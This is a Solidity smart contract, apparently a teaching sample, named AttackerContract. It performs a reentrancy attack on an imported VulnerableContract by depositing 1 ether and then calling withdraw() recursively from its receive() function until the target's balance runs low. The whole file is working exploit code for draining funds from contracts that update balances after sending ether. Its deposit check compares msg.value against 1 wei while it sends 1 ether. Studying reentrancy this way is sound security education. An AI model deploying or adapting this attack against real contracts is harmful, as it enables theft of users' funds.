// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./VulnerableContract.sol";

error AttackerContract__NotEnoughETH();

/** @title A sample Insecure Vulnerable Contract
 * @author Simona Kastantinaviciute
 * @notice This contract is an example of attacker smart contract, which performs recursive withdrawals
 */

contract AttackerContract {
    VulnerableContract public immutable vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = VulnerableContract(_vulnerableContractAddress);
    }

    // low-level function performing multiple reentrants calling the withdraw function
    // the call function is executed before updating the withdrawer’s balance to 0
    receive() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw();
        }
    }

    function attack() external payable {
        if (msg.value < 1) {
            revert AttackerContract__NotEnoughETH();
        }
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw();
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
